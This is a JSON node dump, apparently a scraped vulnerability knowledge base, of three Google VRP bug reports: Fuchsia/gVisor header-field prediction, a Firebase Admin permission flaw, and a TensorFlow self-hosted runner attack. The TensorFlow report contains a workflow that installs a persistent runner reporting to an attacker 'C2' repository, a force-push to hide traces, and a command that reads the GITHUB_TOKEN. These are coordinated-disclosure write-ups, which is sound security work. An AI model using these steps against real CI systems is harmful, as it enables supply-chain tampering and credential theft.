"file_name": "20250408_175647_483250.txt", "file_type": "text/plain", "file_size": 7346, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "2fa06436efa54db696709fb8ad1d4204198fd0790062afcb7690643f04360232", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "339e5f4d-8538-4716-a1ac-87f50d0df7d3", "node_type": "1", "metadata": {}, "hash": "d8d5c97a2f95e9fab424ffa324df6fc1ea5589ac7d8bd329c5957633e2e496b3", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nVulnerabilities in the algorithms used by Fuchsia/gVisor to populate network protocol header fields, specifically the TCP ISN, TCP timestamp, TCP and UDP source ports, and IPv4/IPv6 fragment ID\r\nGoogle VRP\r\ntriaged\r\n19:48 | Oct 5, 2023\r\naccepted\r\n19:56 | Oct 5, 2023\r\ntriaged\r\n15:55 | Dec 7, 2023\r\naccepted\r\n19:18 | Dec 7, 2023\r\ntriaged\r\n06:03 | Mar 12, 2024\r\naccepted\r\n16:51 | Mar 13, 2024\r\nfixed\r\n20:14 | Oct 31, 2024\r\nreward decided\r\n$7,500\r\nGoogle comment\r\nThe final version of the research paper with the title \"You Can Rand but You Can't Hide: A Holistic Security Analysis of Google Fuchsia's (and gVisor's) Network Stack\" was published at the\r\nNDSS 2025 symposium\r\n. The following corresponding CVEs were issued:\r\nCVE-2024-10026\r\n,\r\nCVE-2024-10603\r\n, and\r\nCVE-2024-10604\r\n.\r\nSummary:\r\nVulnerabilities in the algorithms used by Fuchsia/gVisor to populate network protocol header fields, specifically the TCP ISN, TCP timestamp, TCP and UDP source ports, and IPv4/IPv6 fragment ID\r\nProduct:\r\nFuchsia\r\nURL:\r\nhttps://cs.opensource.google/fuchsia/fuchsia\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nDear Google Fuchsia security Team\r\nThis is Amit Klein, a faculty member of the Hebrew University School of Computer Science and Engineering. I would like to report several security vulnerabilities in gVisor's network stack that we (Inon Kaplan - a PhD candidate in the Hebrew University, Ron Even - a BSc graduate from Bar Ilan University, and yours truly) found during our research. FYI, in parallel we are notifying the gVisor team about our findings, and we are also submitting this manuscript to a conference which will take place in early 2025.\r\nThe full report is attached as a PDF file.\r\nSome highlights:\r\nWe report multiple vulnerabilities in the algorithms used by Fuchsia/gVisor to populate network protocol header fields, specifically the TCP initial sequence number, TCP timestamp, TCP and UDP source ports, and IPv4/IPv6 fragment ID fields. Our attacks result in the exposure of a PRNG seed and a hashing key used to generate the above fields. This enables an attacker to predict future values of the fields, which facilitates several network attacks.\r\nThe paper focuses mostly on device tracking (against Fuchsia), but other attacks are also possible when the PRNG seed and the HashIV key are exposed:\r\nTCP initial sequence number prediction\r\nis a special case of a TCP sequence number prediction attack, which can be used to counterfeit TCP packets.\r\nIn general,\r\npredictable UDP source ports\r\ncan be exploited to mount an effective DNS cache poisoning attack. To be vulnerable to our attack, the DNS software has to use the underlying operating system to select UDP source ports (this is not the case with Fuchsia\u2019s stub DNS resolver. However, there may be other gVisor use cases in which this applies).\r\nTCP source port predictability\r\ncan expedite a TCP blind reset attack.\r\nOur attacks on TCP/IPv4 and the IPv4 ID disclose the device\u2019s\r\ninternal IP address\r\n, even if the device is behind a NAT. This violates the PCI DSS 4.0 Requirement 1.4.5.\r\nOur attack on the\r\nIPv4 ID generation algorithm\r\ncan be used to find IP addresses that collide (served from the same bucket) in the IPv4 ID table, which can be used to predict IPv4 ID values across these addresses. This in turn facilitates DNS cache poisoning attacks, traffic analysis attacks and TCP hijacking attacks.\r\nIn general, when a PRNG is used to generate sensitive data, having a\r\npredictable PRNG\r\nmay result in security vulnerabilities.\r\nOur main results are explained in sections III-VI of the paper. Section VII discusses our experiments with our PoC server and several Fuchsia devices over multiple networks. Section VIII discusses root causes and provides recommendations.\r\nWe also note that the Fuchsia NetStack3 implementation of TCP/UDP source port selection algorithm is vulnerable to a device tracking attack, as explained in Appendix A. NetStack3 is presently not the default stack in Fuchsia.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4039, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "339e5f4d-8538-4716-a1ac-87f50d0df7d3": {"__data__": {"id_": "339e5f4d-8538-4716-a1ac-87f50d0df7d3", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.txt", "file_name": "20250408_175647_483250.txt", "file_type": "text/plain", "file_size": 7346, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b364a1bd-be12-4360-8a87-6afe2ec8003c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.txt", "file_name": "20250408_175647_483250.txt", "file_type": "text/plain", "file_size": 7346, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "2fa06436efa54db696709fb8ad1d4204198fd0790062afcb7690643f04360232", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "7af79901-0e8d-47da-95ba-214122fbc194", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.txt", "file_name": "20250408_175647_483250.txt", "file_type": "text/plain", "file_size": 7346, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "bcf011a68102c412bdf81648013677902bbc8c2a6f70715357e784d0003e232b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Our attack on the\r\nIPv4 ID generation algorithm\r\ncan be used to find IP addresses that collide (served from the same bucket) in the IPv4 ID table, which can be used to predict IPv4 ID values across these addresses. This in turn facilitates DNS cache poisoning attacks, traffic analysis attacks and TCP hijacking attacks.\r\nIn general, when a PRNG is used to generate sensitive data, having a\r\npredictable PRNG\r\nmay result in security vulnerabilities.\r\nOur main results are explained in sections III-VI of the paper. Section VII discusses our experiments with our PoC server and several Fuchsia devices over multiple networks. Section VIII discusses root causes and provides recommendations.\r\nWe also note that the Fuchsia NetStack3 implementation of TCP/UDP source port selection algorithm is vulnerable to a device tracking attack, as explained in Appendix A. NetStack3 is presently not the default stack in Fuchsia. The relevant file is\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:src/connectivity/network/netstack3/core/src/transport/tcp/socket/mod.rs\r\nFor your convenience, here is a list of relevant source code locations:\r\nGo PRNG advancement:\r\nhttps://github.com/golang/go/blob/master/src/math/rand/rng.go\r\nfunctions Int63 and Uint64\r\nGo PRNG seeding:\r\nhttps://github.com/golang/go/blob/master/src/math/rand/rng.go\r\nfunction Seed\r\nSelection of Go\u2019s PRNG (math.rand):\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/stack/stack.go\r\nfunction New\r\nTCP Secrets initialization:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/transport/tcp/protocol.go\r\nfunction NewProtocol\r\nJenkins One-at-a-time hash:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/hash/jenkins/jenkins.go\r\nfunctions Write and Sum32\r\nTCP ISN (offset):\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/transport/tcp/connect.go\r\nfunction generateSecureISN\r\nTCP Timestamp (offset):\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/transport/tcp/protocol.go\r\nfunction tsOffset\r\nTCP source port:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/ports/ports.go\r\nfunction PickEphemeralPortStable and\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/transport/tcp/endpoint.go\r\nfunction registerEndpoint\r\nUDP source port:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/ports/ports.go\r\nfunction PickEphemeralPort\r\nIPv4 ID:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/network/ipv4/ipv4.go\r\nfunction hashRoute\r\nIPv6 ID:\r\nhttps://cs.opensource.google/fuchsia/fuchsia/+/main:third_party/golibs/vendor/gvisor.dev/gvisor/pkg/tcpip/network/ipv6/ipv6.go\r\nfunction handleFragments\r\nWe look forward to helping you address the vulnerabilities above in a timely manner. We can provide access to our PoC server if required. While we encourage you to provide a fix/patch ASAP, we do kindly ask you to keep the technical information and the nature of the attacks (except their attribution to us) confidential until we disclose them in a coordinated manner.\r\nAttack scenario\r\nThe attacks described in the paper can be mounted remotely, i.e. while a browser running in Fuchsia consumes an attacker web page.\r\nOur main scenario is a device tracking attack, wherein colluding (but unrelated, e.g. using no shared DNS/IP infrastructure) websites can track a Fuchsia device across networks, across time, across browser modes (regular/privacy), and across time. As a by product, our attacks also reveal the internal (private) IPv4 address of the device, even when it's behind a NAT.\r\nWe also describe how to predict UDP source ports, TCP source ports, TCP initial sequence numbers, and IP IDs. All these can be used subsequently for network attacks such as injecting TCP data to an existing connection.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3123, "end_char_idx": 7324, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "bc97e67a-8605-4a3b-b618-00941455e9b7": {"__data__": {"id_": "bc97e67a-8605-4a3b-b618-00941455e9b7", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_582730.txt", "file_name": "20250408_175649_582730.txt", "file_type": "text/plain", "file_size": 1207, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "73438241-b85b-4f2a-81d4-ec965df349a4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_582730.txt", "file_name": "20250408_175649_582730.txt", "file_type": "text/plain", "file_size": 1207, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "59e312bddab3bda50c60b8c8ec8399d32b57deb3f7f9cd4413f2e4e31d9811bf", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\n'Firebase Admin' is able to modify the 'Test Lab'.\r\nGoogle VRP\r\ntriaged\r\n08:33 | Oct 1, 2023\r\naccepted\r\n18:44 | Oct 30, 2023\r\nfixed\r\n15:58 | Dec 7, 2023\r\nSummary:\r\n'Firebase Admin' is able to modify the 'Test Lab'.\r\nProduct:\r\nhttps://console.firebase.google.com/\r\nURL:\r\nhttps://console.firebase.google.com/project/project_id/testlab/histories\r\nVulnerability type:\r\nOther\r\nDetails\r\n'Firebase Admin' is able to modify the 'Test Lab'.\r\nSteps to reproduce:\r\nVisit on browser: \u2018\r\nhttps://console.firebase.google.com/project/project_id/settings/iam'\r\nand login to your \u2018Account-1\u2019.\r\nNow add your \u2018Account-2\u2019 as 'Firebase Admin'.\r\nThen visit on another browser: '\r\nhttps://console.firebase.google.com/project/project_id/testlab/histories'\r\nand login to your \u2018Account-2\u2019.\r\nNow you see 'Test Lab'.\r\nNow you able to view and modify the 'Test Lab' data.\r\nAttack scenario\r\n'Firebase Admin can make changes to: All Firebase products except Test Lab', but due to the issue a 'Firebase Admin' is able to view and modify the 'Test Lab' data. So, it is an issue because it is beyond the permission of the 'Firebase Admin'.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1177, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fd802492-a598-486c-96b2-c6f63a0e16df": {"__data__": {"id_": "fd802492-a598-486c-96b2-c6f63a0e16df", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c215f6d6-4245-463d-99d4-966189f3afcc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "8eb9fc42075945f192bc48a6d4641524c188357a9eac2e75fbb1749fff1003da", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "17316681-6200-47a2-8ea8-9ea967eea101", "node_type": "1", "metadata": {}, "hash": "60f01618028f8a154a70ddb7607dfcee8c743541bc40e22d0312a013327bc9b2", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nTensorflow GitHub Repository Vulnerable to Self-Hosted Runner Attack\r\nGoogle VRP\r\ntriaged\r\n08:53 | Aug 3, 2023\r\naccepted\r\n20:42 | Aug 14, 2023\r\nfixed\r\n16:02 | Dec 20, 2023\r\nreward decided\r\n$13,337\r\nSummary:\r\nTensorflow GitHub Repository Vulnerable to Self-Hosted Runner Attack\r\nProduct:\r\nTensorflow\r\nURL:\r\nhttps://github.com/tensorflow/tensorflow/\r\nVulnerability type:\r\nOther\r\nDetails\r\nDescription:\r\nThe Tensorflow/Tensorflow repository utilizes non-ephemeral self-hosted runners to execute\r\nworkflows. The Tensorflow/Tensorflow also has the default workflow execution setting of \r\nonly requiring approval to run workflows from fork pull requests if the user is a first time contributor. It is possible for anyone who is a contributor to Tensorflow (meaning they have previously submitted a PR that was approved and merged) to modify a workflow in their fork and configure it to run on the self-hosted runners attached to Tensorflow/Tensorflow. This means that members of the public can become contributors and that requiring someone to be a contributor is not a sufficient security boundary to prevent a motivated attacker.\r\nThis is due to little known functionality in GitHub where a workflow that runs on the\r\npull_request\r\ntrigger from\r\na fork PR uses the workflow file from the fork, not the PR base. This means an attacker can alter a workflow to run custom code on a self-hosted runner. For this reason, GitHub strongly recommends avoiding the use of self-hosted\r\nrunners on public repositories (\r\nhttps://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security\r\n)\r\nThis workflow can be used to obtain persistence on the self-hosted runner and \r\nsteal secrets (including a\r\nGITHUB_TOKEN\r\nwith full write permissions) from or tamper with subsequent builds. Depending on the network positioning of the runner, an attacker could conduct on-host privilege escalation and move laterally within Google's network or cloud environment.\r\nExploitation Conditions\r\nFor this vulnerability to be valid, the repository must have the following:\r\nApproval Not Required for Contributors to run Fork PR Workflows\r\nThe default setting for workflow execution from fork PRs is to require \r\napproval only for accounts that have\r\nnot\r\npreviously contributed to the repository.\r\nThere is an option to allow workflow approval for all Fork PRs,\r\nincluding previous contributors, but does not appear to be enabled.\r\nThe proof for this is that pull requests from previous contributors did not\r\nrequire approval for their workflows on the\r\npull_request\r\ntrigger to execute.\r\nSee\r\ncontributor_pr.jpg\r\nand\r\ncontributor_pr_exec.jpg\r\nfor an example of this.\r\nAs of writing Tensorflow/Tensorflow, has\r\n3410\r\ncontributors.\r\nUse of Non-Ephemeral Self-Hosted Runners\r\nThe repository uses non-ephemeral self-hosted runners to run ARM64 Linux CI builds.\r\nThis appears to be the case after inspecting the runner name and machine name \r\nin the workflow run logs. Since the runners are non-ephemeral, a malicious \r\nactor can fork off a process on the runner that continues to run after their job finishes.\r\nA closer inspection of the run logs revealed that the workflows on ARM64 Linux\r\nrunners have a\r\nStop old running containers (if any)\r\nstep. In some cases, this\r\nstep reveals old images that are cleaned. This means that the runner is\r\nnon-ephemeral.\r\nSee\r\nnon_ephemeral_proof.jpg\r\nfor an example.\r\nWe determined that these agents exist by using a slightly modified version of\r\nhttps://github.com/praetorian-inc/gato\r\nthat pulled a large set of workflow run logs and\r\nscanned for unique machine name/runner names.\r\nExploitation Path\r\nSince the fork workflow will not have a\r\nGITHUB_TOKEN\r\nwith write permissions, an attackers \r\ngoal will be to establish persistence on the self-hosted runner to gain \r\naccess to secrets, tamper with builds or move laterally to other Google systems.\r\nThis is possible by running code in the background and passing the\r\nRUNNER_TRACKING_ID\r\nset to 0 as an environment variable.\r\nOne easy way to obtain persistence is to install\r\nanother\r\nself-hosted runner and connect it to a private repository. This will use GitHub as C2 and bypass EDR protections that may be on the host.\r\nThe runner can then be tasked to execute additional commands. Below is a proof-of-concept workflow file to install a self-hosted runner on the Tensorflow ARM64 self-hosted runner and run it in the background.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4517, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "17316681-6200-47a2-8ea8-9ea967eea101": {"__data__": {"id_": "17316681-6200-47a2-8ea8-9ea967eea101", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c215f6d6-4245-463d-99d4-966189f3afcc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "8eb9fc42075945f192bc48a6d4641524c188357a9eac2e75fbb1749fff1003da", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "fd802492-a598-486c-96b2-c6f63a0e16df", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d50ad8081a18e3d67422443423a073a5218f440ff07e7e6e75544f217e14dbc8", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "fecbb84f-a34a-40cd-825c-81f4998cbc4b", "node_type": "1", "metadata": {}, "hash": "c469819b718f90ad8851fbf659fbaa45fac88b698537cc5680c3c6de9fbb1856", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Exploitation Path\r\nSince the fork workflow will not have a\r\nGITHUB_TOKEN\r\nwith write permissions, an attackers \r\ngoal will be to establish persistence on the self-hosted runner to gain \r\naccess to secrets, tamper with builds or move laterally to other Google systems.\r\nThis is possible by running code in the background and passing the\r\nRUNNER_TRACKING_ID\r\nset to 0 as an environment variable.\r\nOne easy way to obtain persistence is to install\r\nanother\r\nself-hosted runner and connect it to a private repository. This will use GitHub as C2 and bypass EDR protections that may be on the host.\r\nThe runner can then be tasked to execute additional commands. Below is a proof-of-concept workflow file to install a self-hosted runner on the Tensorflow ARM64 self-hosted runner and run it in the background.\r\nname: SH Runner POC\r\n\r\non:\r\n  pull_request\r\n\r\njobs:\r\n  unit-tests:\r\n    runs-on: [self-hosted, linux, ARM64]\r\n    steps:\r\n      - uses: actions/checkout@v3\r\n      - name: unit-tests\r\n        continue-on-error: true\r\n        run: |\r\n          C2_REPO=Amb1guousRaccoon/functionality\r\n          INSTALL_DIR=\"/home/ubuntu/.actions-runner\"\r\n\r\n          REG_TOKEN=<SH_RUNNER_INSTALL_TOKEN>\r\n          mkdir $INSTALL_DIR && cd $INSTALL_DIR\r\n          curl -o actions-runner-linux-arm64-2.307.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.307.1/actions-runner-linux-arm64-2.307.1.tar.gz\r\n          tar xzf ./actions-runner-linux-arm64-2.307.1.tar.gz\r\n          ./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name \"tf_persistence\"\r\n          rm actions-runner-linux-arm64-2.307.1.tar.gz\r\n          export RUNNER_TRACKING_ID=0 && nohup ./run.sh &\r\nSteps To Reproduce:\r\nWe did not conduct this attack because it could disrupt Google systems or demonstrate that the vulnerability is present for threat actors. Additionally, Mandiant, now Google, is a client of Praetorian, so we opted to disclose this with a detailed write up instead of overtly demonstrating the vulnerability.\r\nThis can be reproduced by using any account that is a contributor to\r\nTensorflow/Tensorflow\r\n. The Google security team can create a new account, approve a small PR (such as a one-character readme change), and then use that account to reproduce this vulnerability. Alternatively, we are happy to conduct this demonstration with explicit permission.\r\nStep 1\r\nCreate a legitimate pull request for a slight change to the\r\nTensorflow/Tensorflow\r\nrepository (such as a typo fix) and wait for it to be approved and merged.\r\nStep 2\r\nCreate a fork of the repository. Within the fork, remove all existing workflows that run on the\r\npull_request\r\ntrigger.\r\nStep 3\r\nAdd a new workflow file to deploy persistence on the build agent. The proof of concept provided in the report demonstrates a payload that installs a\r\nnew\r\nself hosted runner on the existing runner. This will allow persistence and evade EDR and any firewall restrictions that might be in place.\r\nStep 4\r\nCreate a draft pull request. This will prevent a request from being sent to codeowners from the change to the workflow yaml file.\r\nStep 5\r\nIf the fork PR settings are set to the default value of not requiring approval for previous contributors, the workflow will execute, fork off a process, and exit.\r\nStep 6\r\nForce push the code in the draft PR back to the main commit. This will close the PR and hide obvious indications of malicious activity.\r\ngit reset --soft HEAD~1\r\n  git push --force\r\nStep 7\r\nWait for another build not from a fork PR to execute on the runner. This can be done by observing the TensorFlow actions run logs. The new self-hosted runner agent will be active while other builds run. A simple workflow can be added to the C2 repository to run a single command on the\r\nworkflow_dispatch\r\ntrigger.\r\nRun a command to steal the\r\nGITHUB_TOKEN\r\nfrom the runner's working directory:\r\nfind /home/ubuntu/actions-runner/_work -type f -name config | xargs cat\r\nNOTE\r\n: The GITHUB_TOKEN is only valid for the duration of a build. If other builds are very short, then the\r\nGITHUB_TOKEN\r\nmust be used immediately after stealing. However, it does not impact what an attacker can do with it.", "mimetype": "text/plain", "start_char_idx": 3716, "end_char_idx": 7894, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "fecbb84f-a34a-40cd-825c-81f4998cbc4b": {"__data__": {"id_": "fecbb84f-a34a-40cd-825c-81f4998cbc4b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c215f6d6-4245-463d-99d4-966189f3afcc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "8eb9fc42075945f192bc48a6d4641524c188357a9eac2e75fbb1749fff1003da", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "17316681-6200-47a2-8ea8-9ea967eea101", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.txt", "file_name": "20250408_175649_629907.txt", "file_type": "text/plain", "file_size": 11255, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "a67d30856cd587f1d62bfb544e7836113b9454bd493c192143e73f1ecebd4ea0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "This will close the PR and hide obvious indications of malicious activity.\r\ngit reset --soft HEAD~1\r\n  git push --force\r\nStep 7\r\nWait for another build not from a fork PR to execute on the runner. This can be done by observing the TensorFlow actions run logs. The new self-hosted runner agent will be active while other builds run. A simple workflow can be added to the C2 repository to run a single command on the\r\nworkflow_dispatch\r\ntrigger.\r\nRun a command to steal the\r\nGITHUB_TOKEN\r\nfrom the runner's working directory:\r\nfind /home/ubuntu/actions-runner/_work -type f -name config | xargs cat\r\nNOTE\r\n: The GITHUB_TOKEN is only valid for the duration of a build. If other builds are very short, then the\r\nGITHUB_TOKEN\r\nmust be used immediately after stealing. However, it does not impact what an attacker can do with it.\r\nImmediate Mitigation Steps\r\nThe most immediate way to mitigate this issue is to take the following steps:\r\nRequire approval to run workflows on the\r\npull_request\r\ntrigger for all outside fork PRs, even if they are contributors.\r\nMove the self-hosted runner group from the repository to the\r\ntensorflow\r\norganization,\r\nand configure the group to only run on specific workflows that have already been committed to the main branch. (\r\nhttps://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups#changing-which-workflows-can-access-an-organization-runner-group\r\n) this will prevent the runner from picking up\r\na workflow execution from a fork PR, even if a maintainer with write access approves the workflow.\r\nLonger term, ensure that only ephemeral self-hosted runners (1 build, 1 clean runner) are used for public repository builds.\r\nReferences\r\nhttps://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/\r\nhttps://github.com/nikitastupin/pwnhub/blob/main/writings/github-token.md\r\nhttps://karimrahal.com/2023/01/05/github-actions-leaking-secrets/\r\nhttps://github.com/praetorian-inc/gato\r\nhttps://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution\r\nhttps://slsa.dev/spec/v1.0/verifying-systems\r\nAttack scenario\r\nImpact\r\nThe impact from this vulnerability depends on the permission levels of the\r\nGITHUB_TOKEN\r\nassigned to subsequent builds, branch protection settings\r\nin place for the Tensorflow/Tensorflow repository, and the network positioning of the build machine.\r\nIn this case, the machine ran scheduled builds with a\r\nGITHUB_TOKEN\r\nwith extensive write permissions. See\r\ntf_write_perms.png\r\nto see the token permissions.\r\nThis token would be valid for the life of that particular build. See\r\narm_ci_length.jpg\r\nfor an example of how long these other builds are.\r\nTensorflow uses branch portections for the\r\nmaster\r\nand\r\nnightly\r\nbranches;\r\nhowever, feature branches are not subject to branch protection. An attacker\r\ncould try to commit a change to a feature branch that is under development by a\r\nTensorflow maintainer.\r\nAdditionally, the\r\nGITHUB_TOKEN\r\ncould be used to tamper releases published on\r\nGitHub at\r\nhttps://github.com/tensorflow/tensorflow/releases/\r\n. The source within\r\nthe tar.gz and zip files could be replaced with malicious code.\r\nSecret Disclosure\r\nAn attacker could obtain the following secrets from the repository by using the stolen\r\nGITHUB_TOKEN\r\nto create a feature branch with malicious code, and then issuing a\r\nworkflow_dispatch\r\nevent to it.\r\nThe code within that branch could then dump secrets from the GitHub hosted\r\nrunner's memory or monitor subsequent steps for secrets. The AWS PyPi token\r\ncould be stolen directly from a runner since it is used in workflows that also\r\nrun on the ARM64 linux runners.\r\nGCP_CREDS\r\nAWS_PYPI_ACCOUNT_TOKEN\r\nJENKINS_TOKEN\r\nDOCKERHUB_USERNAME\r\nDOCKERHUB_TOKEN\r\nPersistence on Build Servers\r\nTensorflow uses several non-ephemereal runners for ARM64 Linux CI. Some of the\r\nrunner names are:\r\nrunner6\r\nrunner7\r\nrunner9\r\nrunner13\r\nrunner15\r\nAn attacker might be able to conduct lateral movement depending any service\r\naccount permissions or network targets these build runners might have access to.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 7071, "end_char_idx": 11239, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8dbc1279-d151-4c8e-8419-93354d109408": {"__data__": {"id_": "8dbc1279-d151-4c8e-8419-93354d109408", "embedding": null, "metadata": {"file_path": 